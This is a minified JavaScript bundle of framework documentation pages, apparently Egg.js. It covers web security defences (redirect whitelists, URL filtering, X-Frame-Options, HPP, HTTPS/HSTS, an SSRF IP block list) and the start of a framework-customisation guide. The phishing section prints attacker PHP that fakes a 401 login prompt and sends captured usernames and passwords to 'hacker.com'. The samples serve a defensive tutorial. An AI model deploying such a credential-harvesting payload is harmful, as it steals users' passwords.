forbidden."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.unsafeRedirect(url)")," Allow all redirects, It is generally not recommended to use after a clear understanding of possible risks.")),r.a.createElement("p",null,"Safety plan covers the default ",r.a.createElement("code",null,"ctx.redirect")," method, all redirects will go through security domain."),r.a.createElement("p",null,"You need to do the following configuration in the application configuration file if user use ",r.a.createElement("code",null,"ctx.redirect")," method:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.security = {\n  domainWhiteList: ['.domain.com'], // security domain while list, start with .\n};",lang:"js"}),r.a.createElement("p",null,"If user did not configure ",r.a.createElement("code",null,"domainWhiteList")," or ",r.a.createElement("code",null,"domainWhiteList")," array is empty, default will release all redirect requests, that is equal to ",r.a.createElement("code",null,"ctx.unsafeRedirect(url)")),r.a.createElement("h3",{id:"photo-phishing"},r.a.createElement(l["AnchorLink"],{to:"#photo-phishing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Photo Phishing"),r.a.createElement("p",null,"If website allow users insert unverified images into the web page, that will make a risk of Phishing."),r.a.createElement("p",null,"Like common ",r.a.createElement("code",null,"401 Phishing")," for example, when user accessing the page, it pops up a verification page to let user input account and password, when user input, account and password will be stored in the hacker's server."),r.a.createElement("p",null,"Usually this kind of situation will appear in ",r.a.createElement("code",null,"<img src=$url />"),", and not verify the ",r.a.createElement("code",null,"$url")," whether within the domain name white list."),r.a.createElement("p",null,"Attacker can construct the following code in his own server:"),r.a.createElement("p",null,"401.php, used to pop up 401 window, then record user information:"),r.a.createElement(o["a"],{code:"<?php\n      header('WWW-Authenticate: Basic realm=\"No authorization\"');\n      header('HTTP/1.1 401 Unauthorized');\n          $domain = \"http://hacker.com/fishing/\";\n          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){\n                  header(\"Location: \".$domain.\"record.php?a=\".$_SERVER[sectech:'PHP_AUTH_USER'].\"&b=\".$_SERVER[sectech:'PHP_AUTH_PW']);\n          }\n  ?>",lang:"php"}),r.a.createElement("p",null,"Then attacker generate an image url",r.a.createElement("code",null,'<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" />'),"."),r.a.createElement("p",null,"If user access the page, it will popup a window, and let user type in user's name and password, then account and password will be stored in the hacker's server."),r.a.createElement("h3",{id:"prevention-5"},r.a.createElement(l["AnchorLink"],{to:"#prevention-5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention"),r.a.createElement("p",null,"Framework provides ",r.a.createElement("code",null,".surl()")," macro to do url filtering.It is Used to parse the url in the HTML tags in place (such as ",r.a.createElement("code",null,'<a href ="" /><img src=""/>'),"), other places are not allowed to use."),r.a.createElement("p",null,"You can add ",r.a.createElement("code",null,"helper.surl($value)")," in the template to output variable."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: in places where you need to parse the url, you must add double quotes outside of surl, or you will result in XSS vulnerabilities.")),r.a.createElement("p",null,"Do not use ",r.a.createElement("code",null,"surl")),r.a.createElement(o["a"],{code:'<a href="$value" />',lang:"html"}),r.a.createElement("p",null,"output:"),r.a.createElement(o["a"],{code:'<a href="http://ww.safe.com<script>" />',lang:"html"}),r.a.createElement("p",null,"Use ",r.a.createElement("code",null,"surl")),r.a.createElement(o["a"],{code:'<a href="helper.surl($value)" />',lang:"html"}),r.a.createElement("p",null,"output:"),r.a.createElement(o["a"],{code:'<a href="http://ww.safe.com&lt;script&gt;" />',lang:"html"}),r.a.createElement("h3",{id:"iframe-phishing"},r.a.createElement(l["AnchorLink"],{to:"#iframe-phishing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Iframe Phishing"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Cross_Frame_Scripting"},"Iframe Phishing")," By embedding iframe into the hacked page, the attacker can direct users to click on the iframe's dangerous website or even cover it, affecting the normal function of the site and hijacking the user's click operation."),r.a.createElement("p",null,"Framework provides ",r.a.createElement("code",null,"X-Frame-Options")," this security header to prevent iframe Phishing. The default value is ",r.a.createElement("code",null,"SAMEORIGIN"),", which allows only the same domain to embed this page as an iframe."),r.a.createElement("p",null,"This configuration can be turned off when you need to embed some trusted third-party web pages."),r.a.createElement("h2",{id:"prevention-of-security-threats-hpp"},r.a.createElement(l["AnchorLink"],{to:"#prevention-of-security-threats-hpp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention of Security Threats ",r.a.createElement("code",null,"HPP")),r.a.createElement("p",null,"HTTP protocol allows the parameters of the same name appears many times, due to the implementation of the application is not standard, the attacker from the distribution of parameters of transmission key and the value of different parameters, will cause to bypass the consequences of some protection."),r.a.createElement("p",null,"The possible security threats to HPP are:"),r.a.createElement("ul",null,r.a.createElement("li",null,"bypass protection and parameter checking."),r.a.createElement("li",null,"generate logical vulnerabilities and errors that affect application code execution.")),r.a.createElement("h3",{id:"more-1"},r.a.createElement(l["AnchorLink"],{to:"#more-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"More"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)"},"https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://blog.csdn.net/eatmilkboy/article/details/6761407"},"http://blog.csdn.net/eatmilkboy/article/details/6761407")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf"},"https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf")),r.a.createElement("li",null,"ebay RCE risk\uff1a",r.a.createElement(l["Link"],{to:"http://secalert.net/2013/12/13/ebay-remote-code-execution/"},"http://secalert.net/2013/12/13/ebay-remote-code-execution/"))),r.a.createElement("h3",{id:"how-to-protect"},r.a.createElement(l["AnchorLink"],{to:"#how-to-protect","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Protect"),r.a.createElement("p",null,"The framework itself forces the use of the first parameter when the client transports the same key and value different parameters, so it does not lead to an HPP attack."),r.a.createElement("h2",{id:"man-in-middle-attack-with-http--https"},r.a.createElement(l["AnchorLink"],{to:"#man-in-middle-attack-with-http--https","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Man-in-the-middle_attack"},"man-in-middle attack")," with HTTP / HTTPS"),r.a.createElement("p",null,'HTTP is a widely used protocol for Web applications, responsible for Web content requests and acquisitions. Content request will across lots of "middleman", mainly in network link, ACTS as the content of the entrance to the browser, router, WIFI providers, communications operators. if you use a proxy, over the wall software will introduce more "middleman". Because the path and parameters of the HTTP request are explicitly written, these "middleman" can monitor, hijack, and block HTTP requests, it is called man-in-middle attack.'),r.a.createElement("p",null,"In the absence of HTTPS, ISPs can jump the link directly to an AD when the user initiates a request, or change the search results directly into their own ads. If there is a BUG in the hijacking code, the user will not be able to use the website, the white screen will appear."),r.a.createElement("p",null,"Data leakage, request hijacking, content tampering, etc., the core reason is that HTTP is completely naked, and the domain name, path and parameters are clearly visible to the middle people. HTTPS does this by encrypting requests to make them more secure to users. In addition to protecting the interests of users, it can also avoid the traffic being held hostage to protect its own interests."),r.a.createElement("p",null,"Although HTTPS is not absolute security, the organization that holds the root certificate and the organization that controls the encryption algorithm can also conduct a man-in-middle attack. But HTTPS is the most secure solution under the current architecture, and it significantly increases the cost of man-in-middle attack."),r.a.createElement("p",null,"So, if you use the Egg framework to develop web site developers, please be sure to update your website to HTTPS."),r.a.createElement("p",null,"For HTTPS, one should pay attention to is the HTTP transport security (HSTS) strictly, if you don't use HSTS, when a user input url in the browser without HTTPS, the browser will use HTTP access by default."),r.a.createElement("p",null,"Framework has disableb ",r.a.createElement("code",null,"HSTS Strict-Transport-security")," by default, then make the HTTPS site not redirect to HTTP. If your site supports HTTPS, be sure to open it.If our Web site is an HTTP site, we need to close this header."),r.a.createElement("p",null,"The configuration is as follows:"),r.a.createElement("ul",null,r.a.createElement("li",null,"maxAge one yeah for default ",r.a.createElement("code",null,"365 * 24 * 3600"),"\u3002"),r.a.createElement("li",null,"includeSubdomains default is false, you can add subdomain to confirm all subdomains could be accessed by HTTPS.")),r.a.createElement("h2",{id:"ssrf-protection"},r.a.createElement(l["AnchorLink"],{to:"#ssrf-protection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"SSRF Protection"),r.a.createElement("p",null,"In a ",r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Server_Side_Request_Forgery"},"Server-Side Request Forgery (SSRF)")," attack, the attacker can abuse functionality on the server to read or update internal resources."),r.a.createElement("p",null,"Generally, SSRF are common in that developers directly request the URL resources passed in by the client on the server side. Once an attacker passes in some internal URLs, an SSRF attack can be initiated."),r.a.createElement("h3",{id:"how-to-protect-1"},r.a.createElement(l["AnchorLink"],{to:"#how-to-protect-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Protect"),r.a.createElement("p",null,"Usually, we will prevent SSRF attacks based on the IP blacklist of intranets. By filtering the IP addresses obtained after resolving domain names, we prohibit access to internal IP addresses to prevent SSRF attacks."),r.a.createElement("p",null,"The framework provides the ",r.a.createElement("code",null,"safeCurl")," method on ",r.a.createElement("code",null,"ctx"),", \u02bbapp",r.a.createElement("code",null,"and"),"agent",r.a.createElement("code",null,", which will filter the specified intranet IP address while doing the network request. In additon of the method are the same as "),"curl`."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.safeCurl(url, options)")),r.a.createElement("li",null,r.a.createElement("code",null,"app.safeCurl(url, options)")),r.a.createElement("li",null,r.a.createElement("code",null,"agent.safeCurl(url, options)"))),r.a.createElement("h4",{id:"configurations"},r.a.createElement(l["AnchorLink"],{to:"#configurations","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configurations"),r.a.createElement("p",null,"Calling the ",r.a.createElement("code",null,"safeCurl")," method directly does not have any effect. It also needs to work with security configurations."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ipBlackList"),"(Array) - \bConfigure the intranet IP address list. IP addresses on these network segments cannot be accessed."),r.a.createElement("li",null,r.a.createElement("code",null,"checkAddress"),"(Function) - Directly configure a function to check the IP address, and determine whether it is allowed to be accessed in ",r.a.createElement("code",null,"safeCurl")," according to the return value of the function. When returning is not ",r.a.createElement("code",null,"true"),", this IP cannot be accessed. ",r.a.createElement("code",null,"checkAddress")," has a higher priority than ",r.a.createElement("code",null,"ipBlackList"),".")),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.security = {\n  ssrf: {\n    ipBlackList: [\n      '10.0.0.0/8', // support CIDR subnet\n      '0.0.0.0/32',\n      '127.0.0.1', // support specific IP address\n    ],\n    // ipBlackList does not take effect when checkAddress is configured\n    checkAddress(ip) {\n      return ip !== '127.0.0.1';\n    },\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"other-build-in-security-tools"},r.a.createElement(l["AnchorLink"],{to:"#other-build-in-security-tools","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Other Build-in Security Tools"),r.a.createElement("h3",{id:"ctxissafedomaindomain"},r.a.createElement(l["AnchorLink"],{to:"#ctxissafedomaindomain","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ctx.isSafeDomain(domain)"),r.a.createElement("p",null,"To judge whether a domain is a secure domain. It is configured in the security configuration, see ",r.a.createElement("code",null,"ctx.redirect")," parts."),r.a.createElement("h3",{id:"appinjectcsrfstr"},r.a.createElement(l["AnchorLink"],{to:"#appinjectcsrfstr","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app.injectCsrf(str)"),r.a.createElement("p",null,"This function provides template preprocessing - the ability to automatically insert CSRF key, which can be automatically inserted CSRF hidden input into all of the form tags, then user will not need to manually write it."),r.a.createElement("h3",{id:"appinjectnoncestr"},r.a.createElement(l["AnchorLink"],{to:"#appinjectnoncestr","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app.injectNonce(str)"),r.a.createElement("p",null,"This function provides the template pretreatment - automatically inserted into the ",r.a.createElement("code",null,"nonce")," ability, if the site opens ",r.a.createElement("code",null,"CSP")," safety http header, and want to use ",r.a.createElement("code",null,"CSP 2.0 nonce")," features, you can use this function. Reference ",r.a.createElement(l["Link"],{to:"https://www.zhihu.com/question/21979782"},"CSP"),"."),r.a.createElement("p",null,"This function scans the script tag in the template and automatically adds ",r.a.createElement("code",null,"nonce"),"."),r.a.createElement("h3",{id:"appinjecthijackingdefensestr"},r.a.createElement(l["AnchorLink"],{to:"#appinjecthijackingdefensestr","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app.injectHijackingDefense(str)"),r.a.createElement("p",null,"For sites that do not open HTTPS, this function can be limited to preventing ISP hijacking.")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},EZPA:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=t.LinkWrapper=void 0;var a=o(n("FU0I")),r=n("310B"),l=["to"];function o(e){return e&&e.__esModule?e:{default:e}}function i(){return i=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},i.apply(this,arguments)}function c(e,t){if(null==e)return{};var n,a,r=s(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}function s(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}var u=function(e){return function(t){var n=t.to,r=c(t,l),o=/^(\w+:)?\/\/|^(mailto|tel):/.test(n)||!n,s=a["default"].isValidElement(r.children);return a["default"].createElement(e,i({to:n||"",component:o?function(){return a["default"].createElement("a",{target:"_blank",rel:"noopener noreferrer",href:n},r.children,n&&!s&&a["default"].createElement("svg",{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15",className:"__dumi-default-external-link-icon"},a["default"].createElement("path",{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}),a["default"].createElement("polygon",{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"})))}:void 0},r,o?{}:{onClick:function(){var e;window.scrollTo({top:0});for(var t=arguments.length,n=new Array(t),a=0;a<t;a++)n[a]=arguments[a];null===(e=r.onClick)||void 0===e||e.apply(this,n)}}))}};t.LinkWrapper=u;var d=u(r.Link);t["default"]=d},Eh57:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=r.toKey,i=r.set;a({target:"Reflect",stat:!0},{defineMetadata:function(e,t,n){var a=arguments.length<4?void 0:o(arguments[3]);i(e,t,l(n),a)}})},EhH2:function(e,t){function n(e,t){for(var n=0;n<t.length;n++){var a=t[n];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(e,a.key,a)}}function a(e,t,a){return t&&n(e.prototype,t),a&&n(e,a),Object.defineProperty(e,"prototype",{writable:!1}),e}e.exports=a,e.exports.__esModule=!0,e.exports["default"]=e.exports},Ejc3:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var a=c(n("FU0I")),r=n("310B"),l=o(n("5xdi"));function o(e){return e&&e.__esModule?e:{default:e}}function i(e){if("function"!==typeof WeakMap)return null;var t=new WeakMap,n=new WeakMap;return(i=function(e){return e?n:t})(e)}function c(e,t){if(!t&&e&&e.__esModule)return e;if(null===e||"object"!==s(e)&&"function"!==typeof e)return{default:e};var n=i(t);if(n&&n.has(e))return n.get(e);var a={},r=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var l in e)if("default"!==l&&Object.prototype.hasOwnProperty.call(e,l)){var o=r?Object.getOwnPropertyDescriptor(e,l):null;o&&(o.get||o.set)?Object.defineProperty(a,l,o):a[l]=e[l]}return a["default"]=e,n&&n.set(e,a),a}function s(e){return s="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},s(e)}function u(){return u=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},u.apply(this,arguments)}function d(e,t){return f(e)||g(e,t)||p(e,t)||m()}function m(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function p(e,t){if(e){if("string"===typeof e)return h(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?h(e,t):void 0}}function h(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function g(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function f(e){if(Array.isArray(e))return e}function E(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function b(e,t){for(var n=0;n<t.length;n++){var a=t[n];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(e,y(a.key),a)}}function v(e,t,n){return t&&b(e.prototype,t),n&&b(e,n),Object.defineProperty(e,"prototype",{writable:!1}),e}function y(e){var t=k(e,"string");return"symbol"===s(t)?t:String(t)}function k(e,t){if("object"!==s(e)||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var a=n.call(e,t||"default");if("object"!==s(a))return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}var w=new(function(){function e(){E(this,e),this.anchors=[],this.listeners=[],this.listener=void 0,this.listener=(0,l["default"])(this._matchActiveAnchor.bind(this),200)}return v(e,[{key:"_matchActiveAnchor",value:function(){var e=this,t=this.anchors.findIndex((function(t,n){return t.getBoundingClientRect().top>128||n===e.anchors.length-1})),n=this.anchors[Math.max(0,t-1)],a=n.parentElement.id;this.listeners.forEach((function(e){return e(a)}))}},{key:"watch",value:function(e){0===this.anchors.length&&"undefined"!==typeof window&&window.addEventListener("scroll",this.listener),this.anchors.push(e),this.listener()}},{key:"unwatch",value:function(e){this.anchors.splice(this.anchors.findIndex((function(t){return t===e})),1),0===this.anchors.length&&"undefined"!==typeof window&&window.removeEventListener("scroll",this.listener)}},{key:"listen",value:function(e){this.listeners.push(e)}},{key:"unlisten",value:function(e){this.listeners.splice(this.listeners.findIndex((function(t){return t===e})),1)}}]),e}());function x(e){return e.offsetTop+(e.offsetParent?x(e.offsetParent):0)}var j=function e(t){var n,l=(null===(n=t.to.match(/(#[^&?]*)/))||void 0===n?void 0:n[1])||"",o=(0,a.useRef)(null),i=(0,a.useState)(!1),c=d(i,2),s=c[0],m=c[1];return(0,a.useEffect)((function(){var e,t;if(["H1","H2","H3"].includes(null===(e=o.current)||void 0===e||null===(t=e.parentElement)||void 0===t?void 0:t.tagName)&&o.current.parentElement.id){var n=o.current;return w.watch(n),function(){w.unwatch(n)}}var a=function(e){m(l==="#".concat(e))};return w.listen(a),function(){return w.unlisten(a)}}),[]),a["default"].createElement(r.NavLink,u({},t,{ref:o,onClick:function(){return e.scrollToAnchor(l.substring(1))},isActive:function(){return s}}))};j.scrollToAnchor=function(e){window.requestAnimationFrame((function(){var t=document.getElementById(decodeURIComponent(e));t&&window.scrollTo(0,x(t)-100)}))};var S=j;t["default"]=S},Ekl2:function(e,t,n){"use strict";n.r(t),n.d(t,"matchRoutes",(function(){return i})),n.d(t,"renderRoutes",(function(){return c}));var a=n("3ptp"),r=n("2EJr"),l=n("FU0I"),o=n.n(l);function i(e,t,n){return void 0===n&&(n=[]),e.some((function(e){var r=e.path?Object(a["i"])(t,e):n.length?n[n.length-1].match:a["e"].computeRootMatch(t);return r&&(n.push({route:e,match:r}),e.routes&&i(e.routes,t,n)),r})),n}function c(e,t,n){return void 0===t&&(t={}),void 0===n&&(n={}),e?o.a.createElement(a["g"],n,e.map((function(e,n){return o.a.createElement(a["d"],{key:e.key||n,path:e.path,exact:e.exact,strict:e.strict,render:function(n){return e.render?e.render(Object(r["a"])({},n,{},t,{route:e})):o.a.createElement(e.component,Object(r["a"])({},n,t,{route:e}))}})}))):null}},"F+1Y":function(e,t,n){"use strict";var a=n("0mt+"),r=n("XaNN"),l=n("V3tB"),o=n("PAgB"),i=n("jdHz"),c=n("NBU9"),s="No one promise resolved";a({target:"Promise",stat:!0},{any:function(e){var t=this,n=o.f(t),a=n.resolve,u=n.reject,d=i((function(){var n=r(t.resolve),o=[],i=0,d=1,m=!1;c(e,(function(e){var r=i++,c=!1;o.push(void 0),d++,n.call(t,e).then((function(e){c||m||(m=!0,a(e))}),(function(e){c||m||(c=!0,o[r]=e,--d||u(new(l("AggregateError"))(o,s)))}))})),--d||u(new(l("AggregateError"))(o,s))}));return d.error&&u(d.value),n.promise}})},F2oR:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"If your team have met with these scenarios:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Each project contains the same configuration files that need to be copied every time, such as ",r.a.createElement("code",null,"gulpfile.js"),", ",r.a.createElement("code",null,"webpack.config.js"),"."),r.a.createElement("li",null,"Each project has similiar dependencies."),r.a.createElement("li",null,"It's difficult to synchronize those projects based on the same configurations like those mentioned above once they have been optimized?")),r.a.createElement("p",null,"If your team needs:"),r.a.createElement("ul",null,r.a.createElement("li",null,"a unified technique selection, such as the choice of databases, templates, frontend frameworks, and middlewares."),r.a.createElement("li",null,"a unified default configuration to balance the deviation of different situations, which are not supposed to resolve in code level, like the differences between companies and open communities."),r.a.createElement("li",null,"a unified ",r.a.createElement(l["Link"],{to:"../core/deployment"},"deployment plan")," keeping developers concentrate on code without paying attention to deployment details of connecting the framework and platforms."),r.a.createElement("li",null,"a unified code style to decrease code's repetition and optimize code's appearance, which is important for a enterprise level framework.")),r.a.createElement("p",null,"To satisfy these demands, Egg endows developers with the capacity of ",r.a.createElement("code",null,"customazing a framework"),". It is just an abstract layer, which can be constructed to a higher level framework, supporting inheritance of unlimited times. Futhermore, Egg apply a quantity of coding conventions based on Koa."),r.a.createElement("p",null,"Therefore, a uniform spec can be applied on projects in which the differentiation fulfilled in plugins. And the best practice summed from those projects can be continuously extracted from these plugins to the framework, which is available to other projects by just updating the dependencies' versions."),r.a.createElement("p",null,"See more details in ",r.a.createElement(l["Link"],{to:"../intro/progressive"},"Progressive Development"),"\u3002"),r.a.createElement("h2",{id:"framework-and-multiprocess"},r.a.createElement(l["AnchorLink"],{to:"#framework-and-multiprocess","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Framework and Multiprocess"),r.a.createElement("p",null,"The framework extension is applied to Multiprocess Model, as we know ",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"Multiprocess Model")," and the differences between Agent Worker and App Worker, which have different APIs and both need to inherit."),r.a.createElement("p",null,"They both are inherited from ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core"},"EggCore"),", and Agent is instantiated during the initiation of Agent Worker, while App is instantiated during the initiation of App Worker."),r.a.createElement("p",null,"We could regard EggCore as the advanced version of Koa Application, which integrates built-in features such as ",r.a.createElement(l["Link"],{to:"./loader"},"Loader"),"\u3001",r.a.createElement(l["Link"],{to:"../basics/router"},"Router")," and asynchronous launch."),r.a.createElement(o["a"],{code:"Koa Application\n              ^\n           EggCore\n              ^\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502              \u2502\n   Egg Agent      Egg Application\n      ^               ^\n agent worker     app worker",lang:"unknown"}),r.a.createElement("h2",{id:"how-to-customize-a-framework"},r.a.createElement(l["AnchorLink"],{to:"#how-to-customize-a-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Customize a Framework"),r.a.createElement("p",null,"Just use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-boilerplate-framework"},"egg-boilerplate-framework")," to generates a scaffold for you."),r.a.createElement(o["a"],{code:"$ mkdir yadan && cd yadan\n$ npm init egg --type=framework\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("p",null,"But in order to illustrate details, let's do it step by step. Here is the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/framework"},"sample code"),"."),r.a.createElement("h3",{id:"framework-api"},r.a.createElement(l["AnchorLink"],{to:"#framework-api","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Framework API"),r.a.createElement("p",null,"Each of those APIs is required to be implemented almost twice - one for Agent and another for Application."),r.a.createElement("h4",{id:"eggstartcluster"},r.a.createElement(l["AnchorLink"],{to:"#eggstartcluster","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg.startCluster")),r.a.createElement("p",null,"This is the entry function of Egg's multiprocess launcher, based on ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster"),", to start Master, but EggCore running in a single process doesn't invoke this function while Egg does."),r.a.createElement(o["a"],{code:"const startCluster = require('egg').startCluster;\nstartCluster(\n  {\n    // directory of code\n    baseDir: '/path/to/app',\n    // directory of framework\n    framework: '/path/to/framework',\n  },\n  () => {\n    console.log('app started');\n  },\n);",lang:"js"}),r.a.createElement("p",null,"All available options could be found in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster#options"},"egg-cluster"),"."),r.a.createElement("h4",{id:"eggapplication-and-eggagent"},r.a.createElement(l["AnchorLink"],{to:"#eggapplication-and-eggagent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg.Application")," And ",r.a.createElement("code",null,"egg.Agent")),r.a.createElement("p",null,"These are both singletons but still different with each other. To inherit framework, it's likely to inherited these two classes."),r.a.createElement("h4",{id:"eggappworkerloader-and-eggagentworkerloader"},r.a.createElement(l["AnchorLink"],{to:"#eggappworkerloader-and-eggagentworkerloader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"egg.AppWorkerLoader")," and ",r.a.createElement("code",null,"egg.AgentWorkerLoader")),r.a.createElement("p",null,"To customize framework, Loader is required and has to be inherited from Egg Loader for the propose of either loading directories or rewriting functions."),r.a.createElement("h3",{id:"framework-extension"},r.a.createElement(l["AnchorLink"],{to:"#framework-extension","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Framework Extension"),r.a.createElement("p",null,"If we consider a framework as a class, then Egg framework is the base class,and implementing a framework demands to implement entire APIs of Egg."),r.a.createElement(o["a"],{code:'// package.json\n{\n  "name": "yadan",\n  "dependencies": {\n    "egg": "^2.0.0"\n  }\n}\n\n// index.js\nmodule.exports = require(\'./lib/framework.js\');\n\n// lib/framework.js\nconst path = require(\'path\');\nconst egg = require(\'egg\');\nconst EGG_PATH = Symbol.for(\'egg#eggPath\');\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    // return the path of framework\n    return path.dirname(__dirname);\n  }\n}\n\n// rewrite Egg\'s Application\nmodule.exports = Object.assign(egg, {\n  Application,\n});',lang:"js"}),r.a.createElement("p",null,"The name of framework, default as ",r.a.createElement("code",null,"egg"),", is a indispensable option to launch an application, set by ",r.a.createElement("code",null,"egg.framwork")," of ",r.a.createElement("code",null,"package.json"),", then Loader loads the exported app of a module named it."),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "dev": "egg-bin dev"\n  },\n  "egg": {\n    "framework": "yadan"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"As a loadUnit of framework, yadan is going to load specific 